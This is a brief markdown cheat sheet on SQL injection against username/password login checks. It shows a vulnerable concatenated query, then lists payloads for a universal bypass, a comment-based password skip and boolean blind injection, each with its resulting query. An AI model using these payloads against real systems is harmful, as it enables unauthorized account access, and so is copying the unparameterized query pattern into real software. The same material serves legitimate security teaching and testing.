# User & Password

- ### SQL Command that used to matched 
```
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```
- ## Universal Bypass
- Username: ' OR '1'='1
- Password: ' OR '1'='1
```
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1';
```
- ###  Always True Condition
- Username: admin' --
- This comment (--) ignores the password check.
Resulting Query:
```
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'any';
```

- ### Blind SQL Injection (Boolean-based)

- Username: admin' AND 1=1 -- (returns true)
- Username: admin' AND 1=0 -- (returns false)

---